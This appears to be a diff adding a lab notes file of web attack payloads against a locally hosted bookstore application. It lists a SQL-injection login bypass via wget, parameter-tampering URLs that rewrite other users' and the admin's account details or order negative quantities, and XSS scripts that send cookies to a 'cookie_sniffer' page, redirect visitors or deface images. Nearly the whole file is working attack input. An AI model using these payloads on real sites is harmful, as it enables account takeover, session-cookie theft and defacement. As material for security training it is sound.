@@ -1,0 +1,56 @@
+ >>SQL injection
+wget --save-cookies cookies.txt --post-data="FormName=Login&Login=user'#&Password=$MY_PWD&FormAction=login" http://127.0.0.1:8080/bookstore/Login.jsp
+
+>>Book order
+http://127.0.0.1:8080/bookstore/BookDetail.jsp?quantity=1&FormName=Order&FormAction=insert&item_id=6
+
+http://127.0.0.1:8080/bookstore/MyInfo.jsp?member_password=bad_pwd&name=bad_user&last_name=bad_user&email=bad_user%40localhost&address=Super+Malicous+Address&FormName=Form&FormAction=update&member_id=3&PK_member_id=3
+
+member_password=abcdef&name=user&last_name=user&email=user%40localhost&address=Malicous+Address&phone=&notes=&card_type_id=&card_number=&FormName=Form&FormAction=update&member_id=3&PK_member_id=4
+
+http://127.0.0.1:8080/bookstore/MyInfo.jsp?member_password=12345678&name=bad_user&last_name=user&email=user%40localhost&address=Very+Malicous+Address&phone=&notes=&card_type_id=&card_number=&FormName=Form&FormAction=update&member_id=4&PK_member_id=4
+
+
+http://127.0.0.1:8080/bookstore/ShoppingCart.jsp
+
+
+-----------Param manipulation ------------
+http://127.0.0.1:8080/bookstore/BookDetail.jsp?quantity=-1&FormName=Order&FormAction=insert&item_id=6
+
+
+http://127.0.0.1:8080/bookstore/MyInfo.jsp?member_password=new_pwd&name=very_bad_user&last_name=bad_user&email=bad_user%40localhost&address=Super+Malicous+Address&FormName=Form&FormAction=update&member_id=1&PK_member_id=1
+
+
+http://127.0.0.1:8080/bookstore/MyInfo.jsp?old_member_password=123_pwd&member_password=123_pwd&name=screw_admin&last_name=bad_user&email=bad_user%40localhost&address=Chapin+Address&FormName=Form&FormAction=update&member_id=1&PK_member_id=1
+
+http://127.0.0.1:8080/bookstore/MyInfo.jsp?old_member_password=123_pwd&member_password=123_pwd&name=screw_admin&last_name=bad_user&email=bad_user%40localhost&address=Super+Malicous+Address&FormName=Form&FormAction=update&member_id=1&PK_member_id=1
+
+
+---------------------XSS--------------------
+document.location='http://localhost/cookie_sniffer.php.php?c='+document.cookie;
+
+		use this: //will redirect
+<script>
+document.location=\'http://localhost/cookie_sniffer.php?c=\'+document.cookie;
+</script>
+
+		will redirect
+<script>
+window.location=\'http://www.jokesmasters.com/whatsapp-funny-boy-girl-chat-photo/\';
+</script>
+
+
+		deface
+<script>
+document.getElementsByTagName(\'img\')[0].src = \'http://pappufansclub.com/wp-content/uploads/2016/09/Jokes-images20-1.jpg\'
+</script>
+
+
+		deface
+
+<script>
+<br/>document.getElementsByTagName('img')[0].src = 'http://pappufansclub.com/wp-content/uploads/2016/09/Jokes-images20-1.jpg'
+<br/></script>
+<br/>
+
+
